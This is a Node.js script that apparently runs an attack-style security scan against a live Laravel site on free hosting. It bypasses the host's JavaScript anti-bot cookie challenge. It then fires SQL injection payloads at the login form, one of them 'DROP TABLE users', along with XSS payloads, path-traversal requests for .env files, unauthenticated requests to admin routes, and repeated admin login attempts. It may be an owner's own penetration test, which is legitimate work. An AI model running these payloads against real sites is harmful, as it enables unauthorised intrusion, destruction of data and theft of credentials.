import https from 'node:https';
import crypto from 'node:crypto';

const BASE = 'https://pklubsiv2.rf.gd';

function fetchPage(url, cookie = '') {
  return new Promise((resolve, reject) => {
    const req = https.get(url, {
      headers: { Cookie: cookie },
      followRedirect: false,
    }, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
    });
    req.on('error', reject);
  });
}

function toNumbers(d) {
  const e = [];
  d.replace(/(..)/g, (d) => e.push(parseInt(d, 16)));
  return e;
}

function toHex(d) {
  let e = '';
  for (let f = 0; f < d.length; f++) e += (16 > d[f] ? '0' : '') + d[f].toString(16);
  return e.toLowerCase();
}

function slowAESDecrypt(c, mode, a, b) {
  const key = Buffer.from(a);
  const iv = Buffer.from(b);
  const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
  let decrypted = decipher.update(Buffer.from(c));
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return Array.from(decrypted);
}

async function bypassAndGetCookie() {
  const { body } = await fetchPage(BASE + '/login');
  const matches = body.match(/toNumbers\("([0-9a-f]+)"\)/g);
  if (!matches || matches.length < 3) {
    console.log('No JS challenge found, page might be accessible directly');
    console.log('Body preview:', body.substring(0, 500));
    return '';
  }
  const extract = (m) => m.match(/"([0-9a-f]+)"/)[1];
  const a = toNumbers(extract(matches[0]));
  const b = toNumbers(extract(matches[1]));
  const c = toNumbers(extract(matches[2]));
  const decrypted = slowAESDecrypt(c, 2, a, b);
  const cookieVal = toHex(decrypted);
  return `__test=${cookieVal}`;
}

async function runTests() {
  console.log('=== BYPASSING INFINITYFREE JS CHALLENGE ===\n');
  const cookie = await bypassAndGetCookie();
  if (!cookie) {
    console.log('Could not obtain cookie, aborting.');
    return;
  }
  console.log('Cookie obtained:', cookie.substring(0, 30) + '...\n');

  const headers = { Cookie: cookie };

  // ====== TEST 1: Access login page ======
  console.log('--- TEST 1: Access /login ---');
  const loginPage = await fetchPage(BASE + '/login', cookie);
  console.log('Status:', loginPage.status);
  const hasLoginForm = loginPage.body.includes('name="password"') || loginPage.body.includes('type="password"');
  console.log('Has login form:', hasLoginForm);
  const hasCSRF = loginPage.body.includes('name="_token"') || loginPage.body.includes('csrf');
  console.log('Has CSRF token:', hasCSRF);
  console.log('');

  // ====== TEST 2: SQL Injection on login ======
  console.log('--- TEST 2: SQL Injection on login ---');
  const csrfMatch = loginPage.body.match(/name="_token"\s+value="([^"]+)"/);
  const csrfToken = csrfMatch ? csrfMatch[1] : '';
  console.log('CSRF token obtained:', csrfToken ? 'Yes' : 'No');

  const sqliPayloads = [
    "' OR '1'='1' -- ",
    "admin' -- ",
    "' UNION SELECT 1,2,3 -- ",
    "1; DROP TABLE users -- ",
  ];

  for (const payload of sqliPayloads) {
    const postData = `_token=${encodeURIComponent(csrfToken)}&username=${encodeURIComponent(payload)}&password=test123`;
    const result = await doPost(BASE + '/login', postData, cookie);
    console.log(`  Payload "${payload.substring(0, 30)}...": Status ${result.status} ${result.isRedirect ? '(Redirect to: ' + result.location + ')' : ''}`);
  }
  console.log('');

  // ====== TEST 3: Access .env ======
  console.log('--- TEST 3: Access .env file ---');
  const envPaths = ['.env', '../.env', '....//....//....//.env', '.env.production', '../.env.production'];
  for (const path of envPaths) {
    const result = await fetchPage(BASE + '/' + path, cookie);
    console.log(`  GET /${path}: Status ${result.status}, Length ${result.body.length}, IsEnv: ${result.body.includes('APP_KEY')}`);
  }
  console.log('');

  // ====== TEST 4: Access setup.php ======
  console.log('--- TEST 4: Access setup.php ---');
  const setupPaths = ['setup.php', 'public/setup.php', '../setup.php'];
  for (const path of setupPaths) {
    const result = await fetchPage(BASE + '/' + path, cookie);
    console.log(`  GET /${path}: Status ${result.status}, Length ${result.body.length}`);
  }
  console.log('');

  // ====== TEST 5: Access protected routes without auth ======
  console.log('--- TEST 5: Auth bypass — access protected routes ---');
  const protectedRoutes = [
    '/admin/dashboard',
    '/admin/akun',
    '/dosen/dashboard',
    '/mahasiswa/dashboard',
    '/mentor/dashboard',
    '/admin/akun/create',
    '/admin/proposal',
    '/admin/nilai',
    '/admin/log',
  ];
  for (const route of protectedRoutes) {
    const result = await fetchPage(BASE + route, cookie);
    const isRedirect = result.status === 302 || result.status === 301;
    const location = result.headers.location || '';
    console.log(`  GET ${route}: Status ${result.status} ${isRedirect ? '-> Redirect: ' + location : ''}`);
  }
  console.log('');

  // ====== TEST 6: XSS on login form ======
  console.log('--- TEST 6: XSS on login form ---');
  const xssPayloads = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "<svg onload=alert('xss')>",
  ];
  for (const payload of xssPayloads) {
    const postData = `_token=${encodeURIComponent(csrfToken)}&username=${encodeURIComponent(payload)}&password=test`;
    const result = await doPost(BASE + '/login', postData, cookie);
    const reflected = result.body.includes(payload) || result.body.includes('alert');
    console.log(`  XSS "${payload.substring(0, 25)}...": Reflected=${reflected}, Status=${result.status}`);
  }
  console.log('');

  // ====== TEST 7: Brute force rate limiting ======
  console.log('--- TEST 7: Rate limiting (10 rapid login attempts) ---');
  let rateLimited = false;
  for (let i = 1; i <= 10; i++) {
    const postData = `_token=${encodeURIComponent(csrfToken)}&username=admin&password=wrong${i}&role=admin`;
    const result = await doPost(BASE + '/login', postData, cookie);
    if (result.status === 429) {
      console.log(`  Attempt ${i}: 429 Rate Limited!`);
      rateLimited = true;
      break;
    }
    console.log(`  Attempt ${i}: Status ${result.status} ${result.isRedirect ? '-> ' + result.location : ''}`);
  }
  if (!rateLimited) console.log('  WARNING: No rate limiting detected after 10 attempts!');
  console.log('');

  // ====== TEST 8: Security headers ======
  console.log('--- TEST 8: Security response headers ---');
  const mainPage = await fetchPage(BASE + '/login', cookie);
  const secHeaders = ['x-content-type-options', 'x-frame-options', 'x-xss-protection', 'content-security-policy', 'referrer-policy', 'permissions-policy', 'strict-transport-security'];
  for (const h of secHeaders) {
    const val = mainPage.headers[h] || mainPage.headers[h.toLowerCase()] || 'NOT SET';
    console.log(`  ${h}: ${val}`);
  }
  console.log(`  server: ${mainPage.headers.server || 'NOT SET'}`);
  console.log(`  x-powered-by: ${mainPage.headers['x-powered-by'] || 'NOT SET'}`);
  console.log('');

  // ====== TEST 9: Debug mode ======
  console.log('--- TEST 9: Debug mode check ---');
  const debugResult = await fetchPage(BASE + '/_debugbar', cookie);
  console.log(`  GET /_debugbar: Status ${debugResult.status}`);
  const errorResult = await fetchPage(BASE + '/nonexistent-route-test-404', cookie);
  console.log(`  GET /nonexistent-route: Status ${errorResult.status}`);
  const hasDebugInfo = errorResult.body.includes('Stack trace') || errorResult.body.includes('Debugbar') || errorResult.body.includes('Whoops');
  console.log(`  Debug info in error page: ${hasDebugInfo}`);
  console.log('');

  // ====== TEST 10: CORS & API endpoints ======
  console.log('--- TEST 10: API & sensitive endpoints ---');
  const apiRoutes = ['/api/user', '/api', '/horizon', '/telescope', '/_ignition/health-check', '/vendor/phpunit'];
  for (const route of apiRoutes) {
    const result = await fetchPage(BASE + route, cookie);
    console.log(`  GET ${route}: Status ${result.status}`);
  }

  console.log('\n=== TESTS COMPLETE ===');
}

function doPost(url, data, cookie) {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const options = {
      hostname: urlObj.hostname,
      path: urlObj.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(data),
        Cookie: cookie,
        Referer: url,
      },
    };
    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        resolve({
          status: res.statusCode,
          headers: res.headers,
          body,
          isRedirect: res.statusCode === 302 || res.statusCode === 301,
          location: res.headers.location || '',
        });
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

runTests().catch(console.error);